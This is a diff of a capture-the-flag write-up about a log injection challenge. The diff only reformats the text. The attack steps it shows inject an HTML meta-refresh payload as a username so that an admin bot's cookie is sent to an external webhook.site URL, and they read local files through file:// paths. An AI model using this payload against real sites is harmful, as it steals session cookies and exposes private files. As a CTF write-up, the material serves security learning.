@@ -18,7 +18,7 @@ This challenge is about a Log Injection that leads to exfiltration of cookies.
 
 ![2](https://github.com/H31s3n-b3rg/CTF_Write-ups/assets/66698256/be43b485-a783-4e69-90d9-553995228101)
 
-The only thing we can do on this page is logging in and submitting an url to the admin bot. If we access to the /admin endpoint, we'll get an error:
+The only thing we can do on this page is logging in and submitting an url to the admin bot. If we access to the <code>/admin</code> endpoint, we'll get an error:
 
 ![3](https://github.com/H31s3n-b3rg/CTF_Write-ups/assets/66698256/e5169f48-6c01-4e8a-9ee9-ec89a89ce823)
 
@@ -109,13 +109,13 @@ incorporate part of the log's content (admin's cookie included):
 
 ## Attack
 Steps:
-+Login with username <code><html><head><meta http-equiv="refresh" content='0; url=https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b?exf=</code>.
-+Visit <code>https://instance_server/admin?view=file:///flag.html</code> (it's important that the <code>view</code> parameter contains a valid path (existent file),
++ Login with username <code><html><head><meta http-equiv="refresh" content='0; url=https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b?exf=</code>.
++ Visit <code>https://instance_server/admin?view=file:///flag.html</code> (it's important that the <code>view</code> parameter contains a valid path (existent file),
 because otherwise an error will be triggered and the log's content resetted, deleting our previous input).
-+Submit the url <code>https://127.0.0.1:8080/admin?view=file:///flag.html</code> to the admin bot.
-+Login with username <code><html>'></head></code>.
-+Visit <code>https://instance_server/admin?view=file:///flag.html</code>.
-+Submit the url <code>http://127.0.0.1:8080/admin?view=file:///var/log/adminplz/latest.log</code> to the admin bot.
++ Submit the url <code>https://127.0.0.1:8080/admin?view=file:///flag.html</code> to the admin bot.
++ Login with username <code><html>'></head></code>.
++ Visit <code>https://instance_server/admin?view=file:///flag.html</code>.
++ Submit the url <code>http://127.0.0.1:8080/admin?view=file:///var/log/adminplz/latest.log</code> to the admin bot.
 
 After executing these steps, our server will receive a GET request with all the exfiltrated content inside a query parameter.
 
